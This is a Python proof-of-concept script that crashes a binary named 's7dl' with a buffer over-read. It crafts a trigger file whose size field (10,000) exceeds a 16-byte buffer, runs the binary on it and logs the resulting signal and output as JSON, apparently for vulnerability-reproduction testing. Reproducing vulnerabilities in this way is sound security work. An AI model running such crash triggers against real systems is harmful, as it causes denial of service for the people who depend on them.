#!/usr/bin/env python3
"""PoC for s7dl: buffer over-read via size > buffer length.

The target binary reads a trigger file with:
  - bytes 0..4: little-endian i32 start offset
  - bytes 4..8: little-endian i32 transfer size
  - bytes 8..:  caller data buffer

When size exceeds the actual buffer length, the binary reads past the
buffer boundary, causing a SIGSEGV (return code -11).
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


def build_trigger() -> bytes:
    """Dynamically construct a trigger payload that causes a crash.

    The trigger uses a small buffer (16 bytes) and a transfer size that
    exceeds it, causing the binary to read past the buffer boundary.
    """
    start = 0
    # A size larger than the buffer forces an out-of-bounds access.
    size = 10_000
    buffer = b"A" * 16
    return struct.pack("<ii", start, size) + buffer


def get_signal_name(returncode: int) -> str | None:
    """Map a negative return code to a signal name."""
    # returncode = -signum on POSIX when killed by a signal
    signum = -returncode
    try:
        return signal.Signals(signum).name
    except (ValueError, AttributeError):
        # Fallback lookup
        sig_map = {
            signal.SIGSEGV: "SIGSEGV",
            signal.SIGABRT: "SIGABRT",
            signal.SIGBUS: "SIGBUS",
            signal.SIGFPE: "SIGFPE",
            signal.SIGILL: "SIGILL",
            signal.SIGKILL: "SIGKILL",
            signal.SIGTERM: "SIGTERM",
        }
        return sig_map.get(signum)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PoC: trigger buffer over-read in s7dl target binary"
    )
    parser.add_argument(
        "--binary",
        required=True,
        help="Path to the target binary (e.g., s7dl)",
    )
    parser.add_argument(
        "--json-out",
        default=None,
        help="Optional path to write the JSON result file",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Timeout in seconds (default: 30)",
    )
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    timeout = args.timeout

    # Build the trigger payload dynamically — no external files.
    payload = build_trigger()

    # Write to a temporary file.
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".trig")
    try:
        tmp.write(payload)
        trigger_path = tmp.name
        tmp.close()

        # Invoke the binary.
        argv = [binary, trigger_path]
        start = time.monotonic()

        try:
            proc = subprocess.run(
                argv,
                capture_output=True,
                timeout=timeout,
            )
            elapsed = time.monotonic() - start
            timed_out = False
            returncode = proc.returncode
            stdout = proc.stdout.decode("utf-8", errors="replace")
            stderr = proc.stderr.decode("utf-8", errors="replace")

            if returncode < 0:
                signal_name = get_signal_name(returncode) or f"SIGNUM{-returncode}"
                observable = {
                    "kind": "crash_trace",
                    "value": f"Process terminated by {signal_name} (exit code {returncode})",
                    "path": None,
                }
                error = None
            elif returncode == 0:
                signal_name = None
                observable = {
                    "kind": "stdout",
                    "value": stdout,
                    "path": None,
                }
                error = None
            else:
                signal_name = None
                observable = {
                    "kind": "combined_output",
                    "value": stdout + stderr,
                    "path": None,
                }
                error = f"Unexpected exit code {returncode}"

        except subprocess.TimeoutExpired:
            elapsed = time.monotonic() - start
            timed_out = True
            returncode = None
            stdout = ""
            stderr = ""
            signal_name = None
            observable = {
                "kind": "crash_trace",
                "value": "Timed out",
                "path": None,
            }
            error = f"Timed out after {timeout}s"

        runtime_ms = round(elapsed * 1000)

        result = {
            "binary": binary,
            "command": argv,
            "returncode": returncode,
            "signal": signal_name,
            "timed_out": timed_out,
            "runtime_ms": runtime_ms,
            "stdout": stdout,
            "stderr": stderr,
            "observable": observable,
            "error": error,
        }

        # Print JSON to stdout.
        print(json.dumps(result, indent=2))

        # Optionally write to a file.
        if args.json_out:
            out_path = os.path.abspath(args.json_out)
            with open(out_path, "w") as f:
                json.dump(result, f, indent=2)

    finally:
        # Clean up the temporary trigger file.
        try:
            os.unlink(trigger_path)
        except OSError:
            pass


if __name__ == "__main__":
    main()